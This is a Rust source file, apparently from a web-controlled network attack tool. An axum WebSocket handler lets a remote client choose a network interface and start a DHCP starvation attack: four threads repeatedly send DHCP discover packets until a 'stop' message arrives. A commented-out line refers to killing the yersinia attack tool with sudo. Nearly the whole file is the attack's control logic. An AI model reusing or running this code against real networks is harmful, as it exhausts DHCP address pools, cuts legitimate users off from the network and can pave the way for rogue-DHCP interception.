use axum::extract::connect_info::ConnectInfo;
use axum::{
    body::Bytes,
    extract::ws::{Message, WebSocket, WebSocketUpgrade},
    response::IntoResponse,
};
use axum_extra::TypedHeader;
use std::process::Command;
use std::time::Duration;

use futures::StreamExt;
use pnet::datalink;
use pnet::datalink::NetworkInterface;
use std::net::SocketAddr;
use std::sync::mpsc::{channel, TryRecvError};
use std::thread;

mod dhcp_discover_sender;

pub fn _dhcp_pig_handler(
    ws: WebSocketUpgrade,
    user_agent: Option<TypedHeader<headers::UserAgent>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
) -> impl IntoResponse {
    let user_agent = if let Some(TypedHeader(user_agent)) = user_agent {
        user_agent.to_string()
    } else {
        String::from("Unknown browser")
    };
    println!("`{user_agent}` at {addr} connected.");
    // finalize the upgrade process by returning upgrade callback.
    // we can customize the callback by sending additional info such as address.
    ws.on_upgrade(move |socket| start_dhcp_starvation(socket, addr))
}

pub async fn start_dhcp_starvation(mut socket: WebSocket, who: SocketAddr) {
    if socket
        .send(Message::Ping(Bytes::from_static(&[1, 2, 3])))
        .await
        .is_ok()
    {
        println!("Pinged {who}...");
    } else {
        println!("Could not send ping {who}!");
        return;
    }

    socket.send(Message::text("connected")).await.unwrap();

    let mut interface: Message = socket.recv().await.unwrap().unwrap();
    while interface.to_text().unwrap().len() == 3 {
        interface = socket.recv().await.unwrap().unwrap();
    }
    println!("Interface: {}", interface.to_text().unwrap());

    let interfaces: Vec<NetworkInterface> = datalink::interfaces();
    let parsed_interface: NetworkInterface = interfaces
        .iter()
        .map(|v| v.clone())
        .filter(|sen| sen.name == interface.to_text().unwrap())
        .collect::<Vec<NetworkInterface>>()[0]
        .clone();
    let (mut _sender, mut receiver) = socket.split();

    let mut recv_task = tokio::spawn(async move {
        loop {
            let msg = receiver.next().await.expect("error").expect("error2");
            if msg.to_text().expect("Can't parse to str") == "stop" {
                println!("Stopping clint");
                // let _raw_res = Command::new("sudo").arg("pkill").arg("-9").arg("yersinia").output().unwrap();
                break;
            }
        }
    });

    // Launch 4 thread separately. Due to move behaviour it's impossible to use interface for all the threads, so it's impossible to start threads from loop.
    let (tx1, rx1) = channel::<()>();
    let (tx2, rx2) = channel::<()>();
    let (tx3, rx3) = channel::<()>();
    let (tx4, rx4) = channel::<()>();

    println!("Start");

    let ifnet1 = parsed_interface.clone();
    let ifnet2 = parsed_interface.clone();
    let ifnet3 = parsed_interface.clone();
    let ifnet4 = parsed_interface.clone();
    thread::spawn(move || {
        loop {
            dhcp_discover_sender::send_dhcp_discover(ifnet1.clone());
            match rx1.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    println!("Terminating.");
                    // cancelled = true;
                    break;
                }
                Err(TryRecvError::Empty) => {}
            }
        }
    });

    thread::spawn(move || {
        loop {
            dhcp_discover_sender::send_dhcp_discover(ifnet2.clone());
            match rx2.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    println!("Terminating.");
                    // cancelled = true;
                    break;
                }
                Err(TryRecvError::Empty) => {}
            }
        }
    });

    thread::spawn(move || {
        loop {
            dhcp_discover_sender::send_dhcp_discover(ifnet3.clone());
            match rx3.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    println!("Terminating.");
                    // cancelled = true;
                    break;
                }
                Err(TryRecvError::Empty) => {}
            }
        }
    });

    thread::spawn(move || {
        loop {
            dhcp_discover_sender::send_dhcp_discover(ifnet4.clone());
            match rx4.try_recv() {
                Ok(_) | Err(TryRecvError::Disconnected) => {
                    println!("Terminating.");
                    // cancelled = true;
                    break;
                }
                Err(TryRecvError::Empty) => {}
            }
        }
    });

    tokio::select! {
        rv_b = (&mut recv_task) => {
            match rv_b {
                Ok(_b) => println!("Rec killed"),
                Err(b) => println!("Error receiving messages {b:?}")
            }
            let _ = tx1.send(());
            let _ = tx2.send(());
            let _ = tx3.send(());
            let _ = tx4.send(());
        }
    }

    println!("Destroying socket");
}
